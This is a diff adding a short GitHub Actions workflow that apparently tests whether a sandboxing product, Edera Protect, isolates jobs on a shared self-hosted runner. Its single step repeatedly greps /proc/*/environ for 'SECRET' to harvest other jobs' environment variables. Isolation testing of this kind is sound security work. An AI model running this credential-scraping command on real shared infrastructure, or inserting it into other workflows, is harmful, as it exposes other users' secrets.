@@ -1,0 +1,16 @@
+name: ARC Open Edera
+on:
+  workflow_dispatch:
+
+jobs:
+  Explore-GitHub-Actions:
+    runs-on: arc-runner-set-edera
+    steps:
+    - run: |
+        echo "We're using Edera Protect this time!"
+        echo "😮 Can we find secrets from other Actions using the same VM to run their workloads?"
+        for ((i=1; i<=100; i++)); do
+          grep -az SECRET /proc/*/environ 2>/dev/null | tr '\0' '\n' || true
+          echo "Trying again in 10 seconds..."
+          sleep 10
+        done
